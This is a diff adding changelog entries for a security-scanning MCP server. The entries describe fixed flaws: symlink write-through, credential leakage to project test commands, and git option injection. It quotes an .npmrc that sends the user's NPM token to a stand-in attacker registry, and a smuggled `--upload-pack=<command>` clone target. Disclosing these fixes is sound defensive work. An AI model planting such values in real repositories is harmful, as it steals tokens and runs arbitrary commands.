@@ -733,6 +733,101 @@ them again. Scans made on the fallback meanwhile are not merged back.
   over.
 - Every connection opens with `trusted_schema = OFF`, `cell_size_check = ON` and no memory map (it
   was 64 MB).
+- **The server wrote through links in the project it was started in, before any tool call.** Startup keeps
+  `.guardian/` out of the project's `.gitignore`, and did it with `existsSync` + `readFileSync` / `writeFileSync`:
+  a dangling `.gitignore` symlink to `<outside>/planted.conf` made startup create that file outside the project
+  with the three-line block (pointed at `~/.gitconfig`, every git command would have broken), and
+  `.gitignore -> /dev/zero` OOM-killed the server in 21 s under a 768 MB limit, before it ever listened. A new
+  `platform/projectFs.ts` is now the one way a project file is read or written. A read refuses, with a typed
+  reason, a path that resolves outside the project, a link to a network or device path, anything but a regular
+  file (judged on a descriptor opened non-blocking, so a FIFO does not wait for a writer), and a file over its
+  cap, and reads at most cap + 1 bytes (`hooks/configFile.ts`'s reader, after a containment check). A write
+  `lstat`s the target and refuses a link (a junction or a dangling link included) or a non-regular file, refuses
+  a directory on the way that resolves outside the project, and goes through a temp file beside the target,
+  published with `link()` (create) or `rename()` (replace), so it never writes through a link or into an inode a
+  hard link shares. The `.gitignore` upkeep is `refused` for a link, a FIFO or a file over 4 MiB, and startup
+  logs why.
+- The tools that write into the project had the same shape, and each was measured writing outside it:
+  `observability_setup` (through a `src/` junction or a dangling `src/logger.ts` link), `init_project`'s config
+  install (a dangling `.gitleaks.toml` link; its manifest through a `.dev-guardian` directory link), its refresh
+  (an "untouched" `.semgrep.yml` that was a link to a file outside was updated in place), and `mcp-config --write`
+  (a dangling `AGENTS.md`, a `.codex` or `.cursor` directory link). All of them now write through
+  `platform/projectFs.ts`; a refresh reports a link or non-regular target as the new `refused` action and never
+  adopts one. `precommit_install` refuses before running pre-commit when `.pre-commit-config.yaml` resolves
+  outside the project, when `.git`, the hooks directory or a hook file is a link, and when `.git` is a file that
+  names another repository's git directory rather than a worktree or submodule of it — pre-commit would have
+  installed hooks there. `.dev-guardian/configs.json`'s `source` and `target` are read contained in `configs/`
+  and the project: a committed manifest naming `/dev/zero` was read by every scan's drift check, and one naming
+  a file outside was hashed.
+- The CLI's reads and writes of the checkout it gates go through the same layer. `baseline update` over a dangling
+  `.guardian/baseline.json` link created the link's target outside the project (measured); it now refuses, exit 3.
+  `scan` refuses a baseline that resolves outside the checkout, is a FIFO or a device, or is over 64 MiB, rather
+  than reading it or reading it as "no baseline". `.guardian/ci.json` (the `start_command`, `accept_partial_parse`
+  and `attest` refusals) and `check`'s `.guardian/hooks-allowlist.json` are read bounded: a FIFO at any of those
+  names blocked the CI job until its own timeout. `dashboard`'s default `.guardian/dashboard.html` is written the
+  same way.
+- **Every other read of a repository file was swept.** 193 raw `fs` read, list, `stat` and write calls in
+  `mcp/src` came down to 93, and a source-scan test (`rawRepoFsSites.test.ts`) now fails on any new one it does
+  not list, each listed one with its reason: dev-guardian's own files, a path the user named, a repository
+  listing that is safe as written (typed from `Dirent`s, never descending a link), or — named, not converted — a
+  repository read in `runners/` or `skillaudit/`, which another review owns. Measured before the sweep: the tree
+  hash every scan computes followed a committed link to a file outside the project (its content changed the
+  hash) and read a `/dev/zero` link without end; `ensureReportDir` created the report directory every scanner
+  writes into at the end of a `.guardian` link; `report_export` wrote through a planted link at its predictable
+  `.guardian/reports/report-<title>/` path; `.guardian/budgets.yml` was read through a link out of the project;
+  and a `.guardianignore` of any size was read whole. Now the tree hash hashes a link by its target text and never
+  opens anything but a regular file; a report directory with a link on its way is replaced by a fresh temp
+  directory; `report_export`, `suggest_fix`'s quoted source, the manifests and lockfiles `deps_update_plan` and
+  `license_compatibility` read, `.npmrc`, the Dockerfiles and compose files `map_attack_surface` reads,
+  discovered OpenAPI specs, the .NET project walks, `.guardianignore`, `.semgrepignore`, the project's Semgrep
+  configs and the fix worktree's manifests all go through `platform/projectFs.ts`; and the walks that listed
+  whatever a directory link pointed at (`detect_stack`, the EF Core and target-framework audits,
+  `scan_dotnet_secrets`, `compliance_check`, `register_custom_rules`' globs, custom rule directories) no longer
+  descend links.
+- **Repository text reached the model and the terminal with its invisible characters intact.** A rule message, a
+  snippet, a file name, a reason or a title from the scanned repository can carry a right-to-left override
+  (`invoice<U+202E>sj.exe` reads as `invoiceexe.js`), a zero-width space or ESC; JSON escapes the C0 controls and
+  nothing else, and only `dev-guardian status` stripped terminal escapes. A new `untrustedText`
+  (`platform/untrustedText.ts`) is applied at the MCP response boundary to every string of every tool result —
+  keys, the error message and content-only payloads included — and of every resource: C0 and C1 controls (`\n`
+  and `\t` kept, except in a path, name, id, title or URL; a Windows `\r\n` in a multi-line field is read as `\n`
+  first, and only a lone `\r` is escaped), the bidi controls, zero-width and every other
+  default-ignorable code point, U+2028/2029 and U+FFF9–FFFB are written as a visible `\u{XXXX}`. The emoji, keycap,
+  CJK-variation and subdivision-flag sequences `audit_mcp_tools` already exempts pass unchanged (the rule now lives
+  in `platform/invisibleChars.ts`, shared by both), and so does every other character — `日本.py` stays `日本.py`.
+  Stored findings keep their bytes. The CLI's human output is escaped too: `scan`'s report, `baseline update`'s gap
+  list and `check --file`'s file name, rule and preview. So is every progress notification's `message` — a
+  scanner's stderr line reached the host's progress display as it was — with its line breaks escaped as well.
+- **`create_fix_pr`'s dry run ran the project's code with every secret the server had.** To judge a fix it runs
+  the project's own test command — `npm test` (`scripts.test`), `pytest` (every `conftest.py`), `cargo test`
+  (`build.rs`), `go test` — in its worktrees, on a dry run too, and it inherited the server's whole environment:
+  a `scripts.test` that dumped `process.env` read `GITHUB_TOKEN`, `NPM_TOKEN`, `NODE_AUTH_TOKEN`, cloud
+  credentials, API keys and every `GUARDIAN_*` (measured: all 14 planted variables). It now runs with
+  `extendEnv: false` and an allowlist — `PATH`, the home and temp directories, the locale, `CI`, what every
+  Windows process expects, and the toolchains' own (`NODE_*`, `PYTHON*`, `CARGO_HOME`, `RUSTUP_HOME`, `GOPATH`,
+  `GOCACHE`, …) — with any credential-looking name, `GUARDIAN_*` and `npm_config_*` removed, in the worktree and
+  the base-commit tree alike. The tool description said a dry run "never leaves the machine"; it now says that a
+  dry run executes the project's test command, which is the project's code.
+- **A repository's `.npmrc` sent `create_fix_pr`'s npm requests, and the user's token, to a host it chose.**
+  `registry=http://<attacker>/` plus `//<attacker>/:_authToken=${NPM_TOKEN}` in a repository made the planning
+  tree's `npm outdated` — and the fix's `npm ci` / `npm install` and the re-scan's `npm audit` — fetch from that
+  host with the user's own `NPM_TOKEN` (measured with a local registry that records `Authorization`, and the same
+  with `@acme:registry=`). `--ignore-scripts` does not stop a fetch. In every checkout it works in, `create_fix_pr`
+  now moves the repository's `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`, `pip.conf`, `pip.ini`, `.pip/`,
+  `.cargo/config.toml` / `.cargo/config`, `.bundle/config` and `NuGet.config` out before any package manager runs
+  (from the project up to the checkout's root), names them in the group's new `package_config_set_aside`, and puts
+  them back before committing. Every package-manager process it runs — `npm`, `pip-audit`, `composer`, `bundle`,
+  `cargo`, `go`, `dotnet restore`, directly or through `deps_update_plan` and `deps_audit` — gets the test
+  command's allowlisted environment plus the user's own package-manager configuration (the `NPM_CONFIG_*`,
+  `PIP_*`, `CARGO_REGISTRIES_*`, `GOPROXY`-family, … and proxy variables, and the variables `~/.npmrc`, `~/.yarnrc`
+  and `~/.yarnrc.yml` reference as `${VAR}`): the user's token still reaches the user's registry, and only it. A
+  fix whose requirements, or a file they include with `-r` / `-c`, choose a pip index (`-i`, `--index-url`,
+  `--extra-index-url`, `--find-links`, `--trusted-host`) is refused when pip would install from them (a pip step,
+  or a re-scan by `deps_audit`), with the new outcome `refused`; so is a Composer fix whose `composer.json`
+  declares `repositories`, which is not planned either.
+- `scan_skill` no longer hands its target to `git clone` as a possible option. A target is cloned when it merely
+  ends in `.git`, so `--upload-pack=<command>;.git` reached git as `--upload-pack`, the temporary directory after it
+  became the repository, and git ran the command to fetch from it. The URL now follows `--`.
 
 ## [3.0.0] - 2026-09-29
 
